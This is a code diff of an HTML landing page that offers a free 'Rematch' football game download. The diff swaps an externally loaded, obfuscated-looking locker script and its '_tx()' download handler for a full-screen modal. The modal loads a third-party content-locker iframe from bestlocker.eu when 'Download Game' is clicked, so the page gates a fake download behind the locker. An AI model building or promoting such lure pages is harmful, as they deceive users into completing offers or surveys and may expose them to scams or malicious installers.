@@ -1,26 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
-
-<!-- clari -->
-<script type="text/javascript">
-  (function(c,l,a,r,i,t,y){
-      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-  })(window, document, "clarity", "script", "q6xfdj165w");
-</script>
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Rematch</title>
-
-  <!-- Added the same script and config from first page -->
-  <script type="text/javascript">
-    var onUVK_dxF_kRgkqc = {"it":4506835,"key":"1a633"};
-  </script>
-  <script src="https://dfmpe7igjx4jo.cloudfront.net/d459c89.js"></script>
 
   <style>
     body {
@@ -88,12 +71,6 @@
       position: relative;
     }
 
-    ul.features li::before {
-      content: "";
-      position: absolute;
-      left: 0;
-    }
-
     .download-button {
       display: block;
       background-color: #007bff;
@@ -125,6 +102,45 @@
       box-shadow: 0 0 8px #000;
     }
 
+    /* Modal styles */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+
+    .modal-content {
+      position: relative;
+      width: 90%;
+      height: 90%;
+      margin: 5% auto;
+      background-color: #000;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .modal iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 30px;
+      color: white;
+      cursor: pointer;
+      z-index: 10000;
+    }
+
     @media (max-width: 600px) {
       .title-section h1 {
         font-size: 22px;
@@ -148,8 +164,8 @@
         <div class="tag">250 MB</div>
       </div>
 
-      <!-- Download button with onclick to _tx() -->
-      <a href="#" class="download-button" onclick="_tx()">Download Game</a>
+      <!-- Updated Download Button -->
+      <a href="#" class="download-button" onclick="openLocker()">Download Game</a>
 
       <div class="description">
          <strong>Rematch – The Ultimate 5v5 Football Showdown!</strong> <br />
@@ -158,15 +174,12 @@
       </div>
 
       <ul class="features">
-        <li>
-           Third-Person Mayhem – Control one player, master the field, and outplay your rivals
-          in fast-paced, arcade-style matches.
-        </li>
-        <li> No Fouls. No Offsides. Just Action. – Keep the game flowing and the intensity high!</li>
+        <li>Third-Person Mayhem – Control one player, master the field, and outplay your rivals in fast-paced, arcade-style matches.</li>
+        <li>No Fouls. No Offsides. Just Action. – Keep the game flowing and the intensity high!</li>
         <img src="https://www2.0zz0.com/2025/05/30/23/603447811.jpeg" alt="Rematch Banner 1" />
-        <li> Global Legends – Play as football icons like Ronaldinho, ter Stegen, and more!</li>
-        <li> Dynamic Arenas & Skills – Unique maps and goalkeeper powers keep every match fresh.</li>
-        <li> Free-to-Play, Easy to Learn, Hard to Master.</li>
+        <li>Global Legends – Play as football icons like Ronaldinho, ter Stegen, and more!</li>
+        <li>Dynamic Arenas & Skills – Unique maps and goalkeeper powers keep every match fresh.</li>
+        <li>Free-to-Play, Easy to Learn, Hard to Master.</li>
         <img src="https://www2.0zz0.com/2025/05/30/23/799625515.jpeg" alt="Rematch Banner 2" />
       </ul>
 
@@ -176,6 +189,31 @@
       </div>
     </div>
   </div>
+
+  <!-- Locker Modal -->
+  <div id="lockerModal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeLocker()">&times;</span>
+      <iframe src="https://bestlocker.eu/iframe/c351c0fc-4c58-11f0-959a-c2a106037d45"></iframe>
+    </div>
+  </div>
+
+  <script>
+    function openLocker() {
+      document.getElementById('lockerModal').style.display = 'block';
+    }
+
+    function closeLocker() {
+      document.getElementById('lockerModal').style.display = 'none';
+    }
+
+    window.onclick = function(event) {
+      const modal = document.getElementById('lockerModal');
+      if (event.target === modal) {
+        closeLocker();
+      }
+    }
+  </script>
 
 </body>
 </html>
